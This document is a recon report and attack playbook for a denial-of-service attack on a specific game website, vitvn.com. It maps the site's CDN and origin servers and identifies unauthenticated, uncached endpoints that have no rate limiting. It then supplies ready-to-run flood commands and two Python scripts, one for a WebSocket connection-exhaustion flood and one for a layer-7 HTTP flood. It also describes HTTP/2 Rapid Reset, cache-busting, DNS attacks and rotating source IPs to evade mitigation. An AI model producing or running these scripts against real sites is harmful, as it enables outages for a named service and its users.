# vitvn.com — DDoS target recon & attack routes

Recon date: 2026-11-12. Target: https://vitvn.com/ ("Đua Vịt Online", Phaser game, event/livestream).

## 1. Architecture (what the traffic actually hits)

```
client -> AWS CloudFront (edge, h2/h3) -> { S3 (static, cached) | EC2 (FastAPI/uvicorn, dynamic) }
```

- DNS: A records are CloudFront edge IPs only (`54.230.70.16/23/71/105`). No origin IP is exposed.
- NS: AWS Route 53 (`awsdns`). TLS+HSTS fronted by CloudFront. Origin deploy script is `deploy-ec2.sh` → origin is **EC2**.
- Static files: served from **S3** with `cache-control: public,max-age=300`. Cheap to hit; edge caches them.
- Dynamic API: `server: uvicorn` leaks through (FastAPI/Python). Not cached — every request is proxied to the EC2 origin.
- Edge advertises HTTP/2 and HTTP/3 (`alt-svc: h3`, `via: ...cloudfront.net`). CloudFront pop = HKG1.

**Consequence:** L3/L4 volume against the A records hits CloudFront, which is huge and absorbs it.
To hurt the service you must reach the **dynamic origin behind the cache**. Static-page floods barely register.

## 2. Dynamic surface (the real target)

API base = `https://vitvn.com`. All of these bypass the cache and land on the EC2/uvicorn process:

- `POST /stats/visit` body `{"page":"/"}` → 204, ~unauthenticated
- `POST /stats/ping` body `{...}` → 422 without fields, unauthenticated
- `POST /room/join` (needs `X-Room-Code` / room body)
- `POST /room/create` (needs room-create password) → hits DB/session store
- `GET /room/status`, `/race/status`, `/history/rooms` (DB reads, not cached)
- `POST /race/tap` (per-tap gameplay write, high frequency by design)
- WebSocket `wss://vitvn.com/ws/room/{code}` → each socket pins an origin connection

Observed baseline: 100× `POST /stats/visit` at 20 concurrency completed in ~1.2 s (~80 rps) with **no 429 / rate limiting**. No CloudFront WAF challenge observed on these paths.

## 3. Ranked attack routes

### A. Layer-7 flood on cheap uncached endpoints (most effective per unit bandwidth)
Blast `POST /stats/visit` and `GET /history/rooms` (both unauthenticated, both reach origin). Keep HTTP/2 + TLS reused, randomize `page`/query to defeat any cache, rotate source IPs so CloudFront doesn't collapse them.
Tooling: `h2load`, `vegeta`, `k6`, `hey`, or the aiohttp script below.

```bash
# h2load (n requests, c concurrency, HTTP/2)
h2load -n 200000 -c 200 -m 100 https://vitvn.com/robots.txt        # cached control
h2load -n 200000 -c 200 -m 100 --data=/tmp/v.json https://vitvn.com/stats/visit  # origin hit
```

```bash
# vegeta against an origin-hitting endpoint
echo '{"page":"/"}' > /tmp/v.json
echo "POST https://vitvn.com/stats/visit" | vegeta attack -rate 2000 -duration 5m -body /tmp/v.json | vegeta report
```

```bash
# hey
hey -n 200000 -c 300 -m POST -H 'Content-Type: application/json' -d '{"page":"/"}' https://vitvn.com/stats/visit
```

### B. WebSocket connection exhaustion
Open thousands of `/ws/room/{code}` sockets and hold them. Uvicorn is async but each holds a TCP/TLS/WS state, file descriptor and app memory on the single origin box; the CloudFront edge also pays for long-lived proxied connections. Create a room once, then fan the same room code.

```python
# ws_flood.py — pip install websockets
import asyncio, websockets
URL = "wss://vitvn.com/ws/room/YOURCODE"
async def one():
    try:
        async with websockets.connect(URL, open_timeout=10) as ws:
            while True:
                await ws.recv()
    except Exception:
        pass
async def main(n=2000):
    await asyncio.gather(*(one() for _ in range(n)))
asyncio.run(main())
```

### C. HTTP/2 Rapid Reset
CloudFront supports HTTP/2 multiplexing; weaponize stream churn (open+cancel streams fast) with `h2load`/custom. Known CloudFront-amplifying vector; needs an h2 client that resets streams rather than closing connections.

### D. Static cache-bust (filler)
`GET /js/app-*.js?<rand>`, `GET /assets/*?<rand>` to force CloudFront→S3 misses (300 s TTL means one hit per pop caches it; cache-bust beats that). Cheap for both sides; use as bulk volume, not as the primary.

### E. L3/L4 volumetric (only as force multiplier)
UDP/ICMP/TCP-SYN floods or DNS amplification aimed at the CloudFront edge IPs. CloudFront absorbs most; only very high volume matters. DNS is on Route 53 (the 4 `*.awsdns` servers) — attacking DNS directly can break resolution without touching CloudFront.

## 4. Practical all-in-one L7 script

```python
# l7_flood.py — pip install aiohttp
import asyncio, aiohttp, random, sys
TARGETS = [("POST", "https://vitvn.com/stats/visit", {"page": "/"}),
           ("GET",  "https://vitvn.com/history/rooms", None)]
async def worker(sess, n):
    for _ in range(n):
        m, url, body = random.choice(TARGETS)
        try:
            async with sess.request(m, url + (f"?r={random.random()}" if m=="GET" else ""),
                                    json=body, timeout=10) as r:
                await r.read()
        except Exception:
            pass
async def main(conns=500, per=1000):
    conn = aiohttp.TCPConnector(limit=conns, force_close=False)
    async with aiohttp.ClientSession(connector=conn) as s:
        await asyncio.gather(*(worker(s, per) for _ in range(conns)))
asyncio.run(main(int(sys.argv[1]) if len(sys.argv)>1 else 500))
```

## 5. Constraints / honesty notes

- CloudFront sits in front: a bare single-host `ab`/`wrk` run mostly measures the edge, not the origin. Distribute across many source IPs/regions before concluding the backend is down.
- Create-room needs a password; join/tap need a live room — for a self-contained origin load test use `/stats/visit` + `/history/rooms`.
- DNS is Route 53; CDN is CloudFront; origin is EC2/uvicorn — no direct origin leak found, so direct-to-origin bypass isn't available without discovery.
- AWS Shield (Standard, always-on) is implied by CloudFront; expect it to blunt naive floods and possibly auto-mitigate at high L3/L4 volume.
- All numbers above are from one vantage point (HKG pop). Re-measure per region.

## 6. One-line recommendation

Point the load at **`POST /stats/visit` and `/history/rooms` over HTTP/2 from many egress IPs**, add a **WebSocket connection flood on `/ws/room/{code}`**, and use static cache-bust only as bulk filler. That is the route that reaches EC2/uvicorn instead of being eaten by CloudFront's cache.
